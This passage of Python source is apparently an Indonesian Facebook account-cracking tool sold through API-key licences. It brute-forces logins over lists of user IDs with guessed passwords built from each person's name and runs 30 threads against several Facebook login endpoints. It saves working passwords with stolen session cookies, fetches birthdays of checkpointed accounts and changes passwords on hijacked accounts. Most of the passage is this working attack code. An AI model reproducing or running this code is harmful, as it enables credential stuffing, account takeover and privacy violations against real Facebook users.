        prints(Panel(f"""[{merah}>[/]] {kuning}{user}|{pasw}[/]
😔 Kata sandi salah atau sudah diubah"""))
# ------- UBAH PASSWORD --------
def ubah_pw(session,response,link2,user,mmk):
    dat,dat2={},{}
    but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
    for x in response("input"):
        if x.get("name") in but:
            dat.update({x.get("name"):x.get("value")})
    ubahPw=session.post(url_mb+link2.get("action"),data=dat).text
    resUbah=BeautifulSoup(ubahPw,"html.parser")
    link3=resUbah.find("form",{"method":"post"})
    but2=["submit[Next]","nh","fb_dtsg","jazoest"]
    if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
        for b in resUbah("input"):
            if b.get("name") in but2:
                dat2.update({b.get("name"):b.get("value")})
        dat2.update({"password_new":"".join(mmk)})
        an=session.post(url_mb+link3.get("action"),data=dat2)
        coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
        open('results/TAB-YES.txt', 'a').write(f" [✓] {user}|{''.join(mmk)}|{coki}\n")
        __crack__().cek_apk(session, user, ''.join(mmk), coki)
# ------- CEK KEY --------
def cek_key():
    logo()
    try:
        open('/data/data/com.termux/.njir.txt', 'r').read()
        print("");prints(Panel("""😝[bold red] akses login di tolak dikarenakan anda sebelumnya sudah register[/]
🤔 ketik[bold green] Upgrade[/] jika ingin upgrade ke premuim, ketik [bold red]Tidak[/] untuk exit atau keluar program.""",title="[bold red]LOGIN DI TOLAK[/]"))
        upd = input(f"  [{M}?{N}] ketik : ")
        if upd =="":
            print("");prints(Panel("😡[bold red] jangan kosong"));time.sleep(3);cek_key()
        elif upd in["upgrade","Upgrade","UPGRADE"]:
            print("");prints(Panel("😋[bold cyan] anda akan di arahkan ke whatsapp[/]"));time.sleep(3);os.system('xdg-open https://wa.me/6287799183568?text=RATU+ERROR+BELI+LISENSINYA+DOOONG...........???');cek_key()
        elif upd in["tidak","Tidak","TIDAK"]:
            print("");prints(Panel("🤠[bold red] terima kasih telah menggunakan script Brute semoga hari² anda menyenangkan"));exit()
        else:
            prints(Panel("😡[bold red] tinggal ketik upgrade atau tidak apasusah nya memek"));time.sleep(3);cek_key()
    except (KeyError,IOError):
        cok()
# ------- LOGIN KEY --------
def cok():
    logo()
    print("");prints(Panel("""ADMIN TIDAK BERTANGGUNG JAWAB ATAS PENYALAHGUNAAN TOOLS INI
JIKA TIDAK MENGERTI MENGGUNAKAN TOOLS SILAHKAN HUBUNGI ADMIN DENGAN KETIK [green]ADMIN[/]
JIKA INGIN MENGGUNAKAN FREE USER SILAHKAN KETIK [bold red]TRIAL[/] UNTUK MENDAPATKAN API KEY GERATIS ([green]1 days[/])
(ADMIN IS NOT RESPONSIBLE FOR ABUSE OF THIS TOOL)
SCRIPT TELAH DI UPATE PADA TANGGAL [[gren]Selasa 22 Maret 2022[/]]""",title="[green]PESAN[/]"))
    key = input("  [*] masukan api key kamu : ")
    if key == '':
        print("");prints(Panel("😡[bold red] jangan kosong"));time.sleep(3);cok()
    elif key in['admin','Admin','ADMIN']:
        print("");prints(Panel("😋[bold cyan] anda akan di arahkan ke whatsapp[/]"));time.sleep(3);os.system('xdg-open https://wa.me/6287799183568?text=RATU+ERROR+BELI+LISENSINYA+DOOONG...........???');cok()
    elif key in['trial','Trial','TRIAL']:
        print("");prints(Panel("😋[bold cyan] anda akan di alihkan ke situs website"));os.system('xdg-open https://apikey.yayanxd.my.id/register/');cok()
    try:
        xxx = requests.get(my_web.format(f"{mene}{kexx}{key}", headers={"user-agent":"Mozilla/5.0 (Linux; Android 9; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36"}, timeout=10))
        req = json.loads(xxx.text)
        kadaluarsa = req['expired']
        user = req["nama"]
        open('/data/data/com.termux/.njir.txt', 'w').write(key)
        print("");prints(Panel(f"""Hallo [green]{user}[/] apikey anda masih berlaku sampai tanggal: [bold red]{kadaluarsa}[/]
silahkan gunakan dengan bijak yah tools nya 😊😊😊"""));time.sleep(2)
        exit(f"\n [{M}!{N}] jalankan ulang perintah nya dengan ketik python run.py id")
    except requests.exceptions.ConnectionError:
        print("");prints(Panel("😭[bold red] gagal menghubungkan ke server, silahkan cek koneksi anda dan mainkan mode pesawat 5 detik."));exit()
    except KeyError:
        print("");prints(Panel(f"😡 apikey [bold red]{key}[/] tidak tersedia di website"));time.sleep(3);cok()
# ------- TAMPILAN APK --------
def tampilkan_apk():
    prints(Panel("menampilkan aplikasi maka akun akan mudah terkena chekpoint dikarenakan memakai module requests berlebihan. tidak di sarankan untuk menampilkan apilkasi."))
    ww=input(f"  [{M}?{N}] ingin menampilkan aplikasi yang terkait [Y/t]: ")
    if ww in ("Y","y","ya"):
        Apk.append("y")
    else:
        Apk.append("t")
# ------- MULAI CRACK --------
class __crack__:

    def __init__(self):
        self.id = []

    def plerr(self,id):
        self.id = open(id,'r').read().splitlines()
        prints(Panel(f"[{biru_m}*[/]] total id : [bold red]{len(self.id)}[/]"))
        ___yayanganteng___ = input(f'  [{O}?{N}] apakah anda ingin menggunakan kata sandi manual? [Y/t]: ')
        tampilkan_apk()
        if ___yayanganteng___ in ('Y', 'y'):
            prints(Panel('[[bold red]![/]] gunakan , (koma) untuk pemisah contoh : sandi123,sandi12345,dll. setiap kata minimal 6 karakter atau lebih'))
            while True:
                pwek = input(f'  [{O}?{N}] masukan kata sandi : ')
                prints(Panel(f'[{biru_m}*[/]] crack dengan sandi -> [ [bold red]{pwek}[/] ]'))
                if pwek == '':
                    print(f'  {N}[{M}×{N}] jangan kosong bro kata sandi nya')
                elif len(pwek)<=5:
                    print(f'  {N}[{M}×{N}] kata sandi minimal 6 karakter')
                else:
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        global prog,des
                        cin = input(f'  [{O}*{N}] method : ')
                        if cin == '':
                            print(f'  {N}[{M}×{N}] jangan kosong bro');__yan__()
                        elif cin == '1':
                            ingfo()
                            prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
                            des = prog.add_task('',total=len(self.id))
                            with prog:
                                with YayanGanteng(max_workers=30) as tret:
                                    for i in self.id:
                                        try:
                                            kimochi = i.split('|')[0]
                                            tret.submit(self.__metode__, kimochi, ysc, "free.facebook.com")
                                        except:pass
                            hapus_dump()
                            hasil(ok,cp)
                        elif cin == '2':
                            ingfo()
                            prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
                            des = prog.add_task('',total=len(self.id))
                            with prog:
                                with YayanGanteng(max_workers=30) as tret:
                                    for i in self.id:
                                        try:
                                            kimochi = i.split('|')[0]
                                            tret.submit(self.__metode__, kimochi, ysc, "free.facebook.com")
                                        except:pass
                            hapus_dump()
                            hasil(ok,cp)
                        elif cin == '3':
                            ingfo()
                            prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
                            des = prog.add_task('',total=len(self.id))
                            with prog:
                                with YayanGanteng(max_workers=30) as tret:
                                    for i in self.id:
                                        try:
                                            kimochi = i.split('|')[0]
                                            tret.submit(self.__metode__, kimochi, ysc, "m.facebook.com")
                                        except:pass
                            hapus_dump()
                            hasil(ok,cp)
                        else:
                            print(f'  {N}[{M}×{N}] input yang bener');__yan__()
                    mentod()
                    __yan__(pwek.split(','))
                    break
        elif ___yayanganteng___ in ('T', 't'):
            mentod()
            self.__pler__()
        else:
            print(f'  [{M}×{N}] y/t bro');self.plerr(id)

    def __metode__(self, user, pasw, cebok):
        global ok, cp, loop
        prog.update(des,description=f'{str(loop)}/{len(self.id)} OK-:[bold green]{len(ok)}[/] CP-:[bold yellow]{len(cp)}[/]')
        prog.advance(des)
        for pw in pasw:
            try:
                pw = pw.lower()
                session=requests.Session()
                uas = "Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
                header1 = {"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; Android 12; Nokia X20 Build/SKQ1.210821.001; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"ja-KS,en-US;q=0.9,en;q=0.8"}
                yan = session.get("https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header1)
                cin = {"lsd":re.search('name="lsd" value="(.*?)"', str(yan.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(yan.text)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
                header2 = {"Host":cebok,"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://"+cebok,"content-type":"application/x-www-form-urlencoded","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"ja-KS,en-US;q=0.9,en;q=0.8"}
                ihh = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = cin, headers = header2, allow_redirects = False)
                if "c_user" in session.cookies.get_dict():
                    cooz = session.cookies.get_dict()
                    coki = 'datr=' + cooz['datr'] + ';' + ('c_user=' + cooz['c_user']) + ';' + ('fr=' + cooz['fr']) + ';' + ('xs=' + cooz['xs'])
                    if "y" in Apk:
                        self.cek_apk(session, user, pw, coki)
                    elif "t" in Apk:
                        tree = Tree("")
                        tree.add(f"[bold green]{user}|{pw}").add(f"[bold green]{coki}")
                        prints(tree)
                    wrt = ' [✓] %s|%s|%s' % (user,pw,coki)
                    ok.append(wrt)
                    open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    self.follow(session,coki)
                    break
                elif "checkpoint" in session.cookies.get_dict():
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        tree = Tree("")
                        tree.add(f"[bold yellow]{user}|{pw}|{day} {month} {year}")
                        prints(tree)
                        wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                        cp.append(wrt)
                        open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
                        year  = ''
                    except:pass
                    tree = Tree("")
                    tree.add(f"[bold yellow]{user}|{pw}")
                    prints(tree)
                    wrt = ' [×] %s|%s' % (user,pw)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
            except Exception as e:
                time.sleep(2)
        loop+=1

    def cek_apk(self, session, user, pw, coki):
        hit1, hit2 = 0,0
        tree = Tree("")
        tree.add(f"[bold green]{user}[bold blue]|[/][bold green]{pw}").add(f"[bold green]{coki}")
        cek = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
        cek2= session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
        if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
            if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
                tree.add("[[bold red]![/]] Tidak ada aplikasi aktif yang terkait")
            else:
                tree.add("[[bold green]+[/]] Aplikasi Aktif:")
                apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
                ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
                for muncul in apkAktif:
                    hit1+=1
                    try:
                        muncul = re.findall('\<a\ href\=\".*?\">(.*?)<\/a\>',str(muncul))[0]
                    except:
                        muncul = muncul
                    if(hit1==1):
                        tree.add("").add(f"[[bold green]{hit1}[/]] {muncul} [bold green]{ditambahkan[hit2]}[/]")
                    else:
                        tree.add("").add(f"[[bold green]{hit1}[/]] {muncul} [bold green]{ditambahkan[hit2]}[/]")
                    hit1+=2
            if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
                tree.add("[[bold red]![/]] Tidak ada aplikasi kadaluarsa yang terkait")
            else:
                tree.add("[[bold red]-[/]] Aplikasi Kadaluarsa:")
                apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
                kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
                for muncul in apkKadaluarsa:
                    hit1+=1
                    try:
                        muncul = re.findall('\<a\ href\=\".*?\">(.*?)<\/a\>',str(muncul))[0]
                    except:
                        muncul = muncul
                    if(hit1==1):
                        tree.add("").add(f"[[bold red]{hit1}[/]] {muncul} [bold red]{kadaluarsa[hit2]}[/]")
                    else:
                        tree.add("").add(f"[[bold red]{hit1}[/]] {muncul} [bold red]{kadaluarsa[hit2]}[/]")
                    hit2+=1
        else:
            tree.add("[[bold red]![/]] cookie invalid")
        return self.xxx(tree)

    def xxx(self, xx):
        prints(xx)

    
    def __pler__(self):
        global prog,des
        yan = input(f'  [{O}*{N}] method : ')
        if yan == '':
            print(f'  {N}[{M}×{N}] jangan kosong bro');self.__pler__()
        elif yan in ('1', '01'):
            ingfo()
            prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
            des = prog.add_task('',total=len(self.id))
            with prog:
                with YayanGanteng(max_workers=30) as tret:
                    for i in self.id:
                        try:
                            uid, name = i.split('|')
                            xz = name.split(' ')
                            pwx = [xz[0]+xz[1],beta,xz[0]+"12345",xz[0]+"123"]
                            tret.submit(self.__metode__, uid, pwx, "free.facebook.com")
                        except Exception as e:
                            time.sleep(2)
            hapus_dump()
            hasil(ok,cp)
        elif yan in ('2', '02'):
            ingfo()
            prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
            des = prog.add_task('',total=len(self.id))
            with prog:
                with YayanGanteng(max_workers=30) as tret:
                    for i in self.id:
                        try:
                            uid, name = i.split('|')
                            xz = name.split(' ')
                            beta = name.lower()
                            pwx = [xz[0]+xz[1],beta,xz[0]+"12345",xz[0]+"123"]
                            tret.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                        except Exception as e:
                            time.sleep(2)
            hapus_dump()
            hasil(ok,cp)
        elif yan in ('3', '03'):
            ingfo()
            prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
            des = prog.add_task('',total=len(self.id))
            with prog:
                with YayanGanteng(max_workers=30) as tret:
                    for i in self.id:
                        try:
                            uid, name = i.split('|')
                            xz = name.split(' ')
                            pwx = [xz[0]+xz[1],beta,xz[0]+"12345",xz[0]+"123"]
                            tret.submit(self.__metode__, uid, pwx, "m.facebook.com")
                        except Exception as e:
                            time.sleep(2)

            hapus_dump()
            hasil(ok,cp)
        else:
            print(f'  {N}[{M}×{N}] input yang bener');self.__pler__()
####New Class By Micron ####
class __filecrack__:

    def __init__(self):
        self.id = []

    def plerr(self):
        prints(Panel(f"[{biru_m}*{hapus}] Ketik 'me' jika ingin crack dari daftar teman anda."))
        micronid = input(f'  [{O}*{N}] File Koi Rakso ? : ')
        try:
            self.id = open(micronid,'r').read().splitlines()
        except (KeyError,IOError):
            print ('\x1b[1;91m[!] File Not Found ')
        prints(Panel(f"[{biru_m}*[/]] total id : [bold red]{len(self.id)}[/]"))
        ___yayanganteng___ = input(f'  [{O}?{N}] apakah anda ingin menggunakan kata sandi manual? [Y/t]: ')
        tampilkan_apk()
        if ___yayanganteng___ in ('Y', 'y'):
            prints(Panel('[[bold red]![/]] gunakan , (koma) untuk pemisah contoh : sandi123,sandi12345,dll. setiap kata minimal 6 karakter atau lebih'))
            while True:
                pwek = input(f'  [{O}?{N}] masukan kata sandi : ')
                prints(Panel(f'[{biru_m}*[/]] crack dengan sandi -> [ [bold red]{pwek}[/] ]'))
                if pwek == '':
                    print(f'  {N}[{M}×{N}] jangan kosong bro kata sandi nya')
                elif len(pwek)<=5:
                    print(f'  {N}[{M}×{N}] kata sandi minimal 6 karakter')
                else:
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        global prog,des
                        cin = input(f'  [{O}*{N}] method : ')
                        if cin == '':
                            print(f'  {N}[{M}×{N}] jangan kosong bro');__yan__()
                        elif cin == '1':
                            ingfo()
                            prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
                            des = prog.add_task('',total=len(self.id))
                            with prog:
                                with YayanGanteng(max_workers=30) as tret:
                                    for i in self.id:
                                        try:
                                            kimochi = i.split('|')[0]
                                            tret.submit(self.__metode__, kimochi, ysc, "free.facebook.com")
                                        except:pass
                            hapus_dump()
                            hasil(ok,cp)
                        elif cin == '2':
                            ingfo()
                            prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
                            des = prog.add_task('',total=len(self.id))
                            with prog:
                                with YayanGanteng(max_workers=30) as tret:
                                    for i in self.id:
                                        try:
                                            kimochi = i.split('|')[0]
                                            tret.submit(self.__metode__, kimochi, ysc, "free.facebook.com")
                                        except:pass
                            hapus_dump()
                            hasil(ok,cp)
                        elif cin == '3':
                            ingfo()
                            prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
                            des = prog.add_task('',total=len(self.id))
                            with prog:
                                with YayanGanteng(max_workers=30) as tret:
                                    for i in self.id:
                                        try:
                                            kimochi = i.split('|')[0]
                                            tret.submit(self.__metode__, kimochi, ysc, "m.facebook.com")
                                        except:pass
                            hapus_dump()
                            hasil(ok,cp)
                        else:
                            print(f'  {N}[{M}×{N}] input yang bener');__yan__()
                    mentod()
                    __yan__(pwek.split(','))
                    break
        elif ___yayanganteng___ in ('T', 't'):
            mentod()
            self.__pler__()
        else:
            print(f'  [{M}×{N}] y/t bro');self.plerr(id)

    def __metode__(self, user, pasw, cebok):
        global ok, cp, loop
        prog.update(des,description=f'{str(loop)}/{len(self.id)} OK-:[bold green]{len(ok)}[/] CP-:[bold yellow]{len(cp)}[/]')
        prog.advance(des)
        for pw in pasw:
            try:
                pw = pw.lower()
                session=requests.Session()
                uas = "Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
                header1 = {"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; Android 12; Nokia X20 Build/SKQ1.210821.001; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"ja-KS,en-US;q=0.9,en;q=0.8"}
                yan = session.get("https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header1)
                cin = {"lsd":re.search('name="lsd" value="(.*?)"', str(yan.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(yan.text)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
                header2 = {"Host":cebok,"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://"+cebok,"content-type":"application/x-www-form-urlencoded","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"ja-KS,en-US;q=0.9,en;q=0.8"}
                ihh = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = cin, headers = header2, allow_redirects = False)
                if "c_user" in session.cookies.get_dict():
                    cooz = session.cookies.get_dict()
                    coki = 'datr=' + cooz['datr'] + ';' + ('c_user=' + cooz['c_user']) + ';' + ('fr=' + cooz['fr']) + ';' + ('xs=' + cooz['xs'])
                    if "y" in Apk:
                        self.cek_apk(session, user, pw, coki)
                    elif "t" in Apk:
                        tree = Tree("")
                        tree.add(f"[bold green]{user}|{pw}").add(f"[bold green]{coki}")
                        prints(tree)
                    wrt = ' [✓] %s|%s|%s' % (user,pw,coki)
                    ok.append(wrt)
                    open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    self.follow(session,coki)
                    break
                elif "checkpoint" in session.cookies.get_dict():
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        tree = Tree("")
                        tree.add(f"[bold yellow]{user}|{pw}|{day} {month} {year}")
                        prints(tree)
                        wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                        cp.append(wrt)
                        open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
                        year  = ''
                    except:pass
                    tree = Tree("")
                    tree.add(f"[bold yellow]{user}|{pw}")
                    prints(tree)
                    wrt = ' [×] %s|%s' % (user,pw)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
            except Exception as e:
                time.sleep(2)
        loop+=1

    def cek_apk(self, session, user, pw, coki):
        hit1, hit2 = 0,0
        tree = Tree("")
        tree.add(f"[bold green]{user}[bold blue]|[/][bold green]{pw}").add(f"[bold green]{coki}")
        cek = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
        cek2= session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
        if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
            if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
                tree.add("[[bold red]![/]] Tidak ada aplikasi aktif yang terkait")
            else:
                tree.add("[[bold green]+[/]] Aplikasi Aktif:")
                apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
                ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
                for muncul in apkAktif:
                    hit1+=1
                    try:
                        muncul = re.findall('\<a\ href\=\".*?\">(.*?)<\/a\>',str(muncul))[0]
                    except:
                        muncul = muncul
                    if(hit1==1):
                        tree.add("").add(f"[[bold green]{hit1}[/]] {muncul} [bold green]{ditambahkan[hit2]}[/]")
                    else:
                        tree.add("").add(f"[[bold green]{hit1}[/]] {muncul} [bold green]{ditambahkan[hit2]}[/]")
                    hit1+=2
            if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
                tree.add("[[bold red]![/]] Tidak ada aplikasi kadaluarsa yang terkait")
            else:
                tree.add("[[bold red]-[/]] Aplikasi Kadaluarsa:")
                apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
                kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
                for muncul in apkKadaluarsa:
                    hit1+=1
                    try:
                        muncul = re.findall('\<a\ href\=\".*?\">(.*?)<\/a\>',str(muncul))[0]
                    except:
                        muncul = muncul
                    if(hit1==1):
                        tree.add("").add(f"[[bold red]{hit1}[/]] {muncul} [bold red]{kadaluarsa[hit2]}[/]")
                    else:
                        tree.add("").add(f"[[bold red]{hit1}[/]] {muncul} [bold red]{kadaluarsa[hit2]}[/]")
                    hit2+=1
        else:
            tree.add("[[bold red]![/]] cookie invalid")
        return self.xxx(tree)

    def xxx(self, xx):
        prints(xx)

    
    def __pler__(self):
        global prog,des
        yan = input(f'  [{O}*{N}] method : ')
        if yan == '':
            print(f'  {N}[{M}×{N}] jangan kosong bro');self.__pler__()
        elif yan in ('1', '01'):
            ingfo()
            prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
            des = prog.add_task('',total=len(self.id))
            with prog:
                with YayanGanteng(max_workers=30) as tret:
                    for i in self.id:
                        try:
                            uid, name = i.split('|')
                            xz = name.split(' ')
                            pwx = [xz[0]+xz[1],beta,xz[0]+"12345",xz[0]+"123"]
                            tret.submit(self.__metode__, uid, pwx, "free.facebook.com")
                        except Exception as e:
                            time.sleep(2)
            hapus_dump()
            hasil(ok,cp)
        elif yan in ('2', '02'):
            ingfo()
            prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
            des = prog.add_task('',total=len(self.id))
            with prog:
                with YayanGanteng(max_workers=30) as tret:
                    for i in self.id:
                        try:
                            uid, name = i.split('|')
                            xz = name.split(' ')
                            beta = name.lower()
                            pwx = [xz[0]+xz[1],beta,xz[0]+"12345",xz[0]+"123"]
                            tret.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                        except Exception as e:
                            time.sleep(2)
            hapus_dump()
            hasil(ok,cp)
        elif yan in ('3', '03'):
            ingfo()
            prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
            des = prog.add_task('',total=len(self.id))
            with prog:
                with YayanGanteng(max_workers=30) as tret:
                    for i in self.id:
                        try:
                            uid, name = i.split('|')
                            xz = name.split(' ')
                            pwx = [xz[0]+xz[1],beta,xz[0]+"12345",xz[0]+"123"]
                            tret.submit(self.__metode__, uid, pwx, "m.facebook.com")
                        except Exception as e:
                            time.sleep(2)

            hapus_dump()
            hasil(ok,cp)
        else:
            print(f'  {N}[{M}×{N}] input yang bener');self.__pler__()
#https://pastebin.com/2hKSXLwD
def cek_server():
    logo()
    try:
        r=requests.Session();req = r.get("://pastebin.com/raw/2hKSXLwD").text
        if "tidak" in req:
            moch_yayan()
        elif "error" in req:
            prints(Panel("""mohon maaf kepada user brute, script sedang bermasalah. tunggu beberapa saat waktu admin sedang berusaha memperbaiki nya 😉
untuk mendapatkan info selanjutnya kunjungi situs web ini:[green] https://www.yayanxd.my.id[/] lalu klik ikon [green]WhatsApp[/]""",title="BERMASALAH"));exit()
        else:
            prints(Panel("[bold red]gagal menghubungkan ke server[/]"))
    except requests.exceptions.ConnectionError:
        print("");prints(Panel("😔[bold red] gagal menghubungkan ke server, silahkan cek koneksi anda dan mainkan mode pesawat 5 detik."));exit()

if __name__ == '__main__':
    moch_yayan()
